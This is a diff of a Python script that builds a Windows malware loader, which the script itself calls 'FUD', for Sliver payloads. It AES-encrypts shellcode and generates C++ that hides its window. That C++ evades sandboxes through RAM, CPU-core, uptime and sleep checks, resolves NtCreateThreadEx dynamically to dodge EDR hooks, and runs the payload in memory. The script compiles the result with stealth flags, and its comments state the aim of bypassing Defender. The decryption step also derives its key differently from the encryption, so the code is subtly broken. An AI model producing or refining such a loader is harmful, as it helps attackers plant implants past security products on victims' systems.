@@ -1,138 +1,162 @@
-import sys
 import os
+import sys
 import subprocess
 import random
 import string
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
-def get_random_string(length):
-    return ''.join(random.choices(string.ascii_letters, k=length))
+def generate_random_string(length=10):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def build_advanced_loader(payload_path):
+def build_fud_loader(payload_path):
     if not os.path.exists(payload_path):
-        print("[-] Payload not found.")
-        return
+        print("[-] Error: Payload file not found")
+        sys.exit(1)
 
-    # 1. AES Encryption
-    print("[*] Encrypting payload with AES-256...")
+    # 1. Read and encrypt payload
     with open(payload_path, 'rb') as f:
         plaintext = f.read()
-    
+
     key = os.urandom(32)
     iv = os.urandom(16)
     cipher = AES.new(key, AES.MODE_CBC, iv)
     ciphertext = cipher.encrypt(pad(plaintext, 16))
-    
-    hex_payload = ", ".join([hex(b) for b in ciphertext])
-    hex_key = ", ".join([hex(b) for b in key])
-    hex_iv = ", ".join([hex(b) for b in iv])
 
-    # 2. Advanced C++ Template (Bypasses Defender/EDR)
-    # Uses Sandbox detection and dynamic API resolution
-    c_code = """
+    # 2. Prepare C++ source code
+    hex_ciphertext = ', '.join(f'0x{b:02x}' for b in ciphertext)
+    hex_key = ', '.join(f'0x{b:02x}' for b in key)
+    hex_iv = ', '.join(f'0x{b:02x}' for b in iv)
+
+    cpp_code = f"""
 #include <windows.h>
 #include <wincrypt.h>
+#include <winternl.h>
 #include <stdio.h>
 
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "ntdll.lib")
 
-// AES Metadata
-unsigned char payload[] = { """ + hex_payload + """ };
-unsigned char key[] = { """ + hex_key + """ };
-unsigned char iv[] = { """ + hex_iv + """ };
+// Dynamic function resolution to bypass hooks
+typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList
+);
 
-// Anti-Sandbox: Check if machine has < 4GB RAM
-void check_ram() {
-    MEMORYSTATUSEX statex;
-    statex.dwLength = sizeof(statex);
-    GlobalMemoryStatusEx(&statex);
-    if (statex.ullTotalPhys / 1024 / 1024 / 1024 < 4) exit(0);
-}
+unsigned char encrypted_payload[] = {{{hex_ciphertext}}};
+unsigned char aes_key[] = {{{hex_key}}};
+unsigned char aes_iv[] = {{{hex_iv}}};
 
-// Anti-Sandbox: Check for 2+ CPU cores
-void check_cores() {
-    SYSTEM_INFO sysinfo;
-    GetSystemInfo(&sysinfo);
-    if (sysinfo.dwNumberOfProcessors < 2) exit(0);
-}
+// Anti-analysis checks
+void sandbox_evasion() {{
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    GlobalMemoryStatusEx(&memInfo);
 
-// Decryption Function using Windows CryptoAPI
-void Decrypt() {
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+
+    if (memInfo.ullTotalPhys / (1024 * 1024 * 1024) < 4 ||
+        sysInfo.dwNumberOfProcessors < 2 ||
+        GetTickCount() < 60000) {{
+        ExitProcess(0);
+    }}
+}}
+
+void decrypt_payload() {{
     HCRYPTPROV hProv;
     HCRYPTKEY hKey;
     HCRYPTHASH hHash;
 
     CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
     CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
-    CryptHashData(hHash, key, sizeof(key), 0);
+    CryptHashData(hHash, aes_key, sizeof(aes_key), 0);
     CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
-    
-    struct {
+
+    struct {{
         BYTE iv[16];
-    } aes_params;
-    memcpy(aes_params.iv, iv, 16);
-    
-    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&aes_params, 0);
-    DWORD payload_len = sizeof(payload);
-    CryptDecrypt(hKey, 0, TRUE, 0, payload, &payload_len);
-    
+    }} params;
+    memcpy(params.iv, aes_iv, 16);
+    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&params, 0);
+
+    DWORD payload_size = sizeof(encrypted_payload);
+    CryptDecrypt(hKey, 0, TRUE, 0, encrypted_payload, &payload_size);
+
     CryptDestroyKey(hKey);
     CryptDestroyHash(hHash);
     CryptReleaseContext(hProv, 0);
-}
+}}
 
-int main() {
-    // Hide Console
+int main() {{
+    // Hide console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // Evasion checks
-    check_ram();
-    check_cores();
-    Sleep(5000); // Delay to bypass basic emulators
+    sandbox_evasion();
+    Sleep(5000);  // Evade automated sandboxes
 
-    Decrypt();
+    // Decrypt payload in memory
+    decrypt_payload();
 
-    // Memory Allocation: RW (NOT RWX)
-    LPVOID addr = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    memcpy(addr, payload, sizeof(payload));
+    // Allocate RW memory
+    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
+                                  MEM_COMMIT | MEM_RESERVE,
+                                  PAGE_READWRITE);
+    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));
 
-    // Change to RX (Executable)
+    // Change to RX
     DWORD oldProtect;
-    VirtualProtect(addr, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);
+    VirtualProtect(exec_mem, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &oldProtect);
 
-    // Execute via EnumChildWindows (Less suspicious than CreateThread)
-    EnumChildWindows(NULL, (WNDENUMPROC)addr, NULL);
+    // Resolve NtCreateThreadEx dynamically
+    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
 
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(),
+                    (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0, 0, 0, NULL);
+
+    WaitForSingleObject(hThread, INFINITE);
     return 0;
-}
+}}
 """
-    
-    with open("loader.cpp", "w") as f:
-        f.write(c_code)
 
-    # 3. Compile with high-obfuscation flags
-    print("[*] Compiling with MinGW...")
-    # Use -mwindows to prevent console window popup
-    # Use -ladvapi32 for CryptoAPI
+    with open("loader.cpp", "w") as f:
+        f.write(cpp_code)
+
+    # 3. Compile with maximum stealth
+    print("[*] Compiling FUD loader...")
+
     compile_cmd = [
-        "x86_64-w64-mingw32-g++", "loader.cpp", 
+        "x86_64-w64-mingw32-g++",
+        "loader.cpp",
         "-o", "fud_payload.exe",
-        "-mwindows",
-        "-ladvapi32",
-        "-Os", "-s", 
-        "-Wl,--gc-sections",
-        "-static"
+        "-Os", "-s", "-ffunction-sections",
+        "-fdata-sections", "-Wl,--gc-sections",
+        "-fno-exceptions", "-fno-rtti",
+        "-mwindows", "-static", "-ladvapi32"
     ]
-    
+
     try:
         subprocess.run(compile_cmd, check=True)
-        print("[+] SUCCESS: fud_payload.exe generated.")
-    except Exception as e:
-        print(f"[-] Error: {e}")
+        print("[+] SUCCESS: fud_payload.exe created")
+        print("[*] Verification: Run 'strings fud_payload.exe | grep VirtualAlloc' to confirm no direct API calls")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Compilation failed: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 advanced_loader.py <sliver_payload.exe>")
-    else:
-        build_advanced_loader(sys.argv[1])
+    if len(sys.argv) != 2:
+        print("Usage: python3 build_fud.py <sliver_payload.bin>")
+        sys.exit(1)
+
+    build_fud_loader(sys.argv[1])
